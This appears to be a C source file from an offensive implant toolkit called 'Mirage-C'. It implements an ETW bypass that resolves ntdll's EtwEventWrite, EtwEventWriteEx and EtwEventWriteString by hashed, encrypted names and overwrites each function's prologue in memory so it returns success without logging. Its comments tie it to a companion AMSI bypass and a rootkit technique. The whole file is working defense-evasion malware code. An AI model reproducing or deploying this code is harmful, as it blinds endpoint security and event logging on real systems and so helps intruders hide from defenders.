/*
 * etw_bypass.c — ETW bypass for Mirage-C
 *
 * In-memory byte patch (PHANTOM-ROOTKIT technique, CRT-free adaptation):
 * patches ntdll!EtwEventWrite, EtwEventWriteEx and EtwEventWriteString
 * prologues with {0x33, 0xC0, 0xC3} (xor eax,eax; ret → STATUS_SUCCESS)
 * via mirage_NtProtectVirtualMemory + a plain byte loop +
 * mirage_NtFlushInstructionCache.
 *
 * Process-wide, no debug registers, no VEH — replaces the old DR0-DR3+VEH
 * scheme that collided with the AMSI bypass (both used DR0) and only
 * protected the calling thread.
 */

#include "etw_bypass.h"
#include "engine.h"
#include "config.h"

#ifdef ENABLE_ETW_BYPASS
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "nt_types.h"
#include "enc_strings.h"
#include <windows.h>

/* xor eax,eax; ret — EtwEventWrite returns STATUS_SUCCESS (0) */
static const uint8_t ETW_PATCH[3] = {0x33, 0xC0, 0xC3};

/* ── Helper: resolve function from module by hash ─────────── */

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Helper: patch 3 bytes at addr with protection flip ───── */

static int patch_bytes(void* addr) {
    PVOID  base = addr;
    SIZE_T size = sizeof(ETW_PATCH);
    ULONG  old  = 0;
    NTSTATUS st = mirage_NtProtectVirtualMemory(
        (HANDLE)(intptr_t)(-1), &base, &size, PAGE_EXECUTE_READWRITE, &old);
    if (st < 0) return 0;

    uint8_t* dst = (uint8_t*)addr;
    for (size_t i = 0; i < sizeof(ETW_PATCH); i++)
        dst[i] = ETW_PATCH[i];

    base = addr;
    size = sizeof(ETW_PATCH);
    mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1), &base, &size,
                                  old, &old);
    mirage_NtFlushInstructionCache((HANDLE)(intptr_t)(-1), addr,
                                   sizeof(ETW_PATCH));
    return 1;
}

/* ── mirage_patch_etw ────────────────────────────────────── */

int mirage_patch_etw(void) {
    char ntdll_name[16];
    enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, ntdll_name);
    void* ntdll = mirage_get_module_by_hash(
        mirage_encrypted_hash_module(ntdll_name));
    if (!ntdll) return 0;

    char fn[32];
    int patched = 0;

    /* PHANTOM's DisableETW: all three writers, success = any one */
    enc_decrypt(enc_EtwEventWrite, ENC_ETWEVENTWRITE_LEN, fn);
    void* p = resolve_func(ntdll, fn);
    if (p && patch_bytes(p)) patched = 1;

    enc_decrypt(enc_EtwEventWriteEx, ENC_ETWEVENTWRITEEX_LEN, fn);
    p = resolve_func(ntdll, fn);
    if (p && patch_bytes(p)) patched = 1;

    enc_decrypt(enc_EtwEventWriteString, ENC_ETWEVENTWRITESTRING_LEN, fn);
    p = resolve_func(ntdll, fn);
    if (p && patch_bytes(p)) patched = 1;

    return patched;
}

#endif /* ENABLE_ETW_BYPASS */
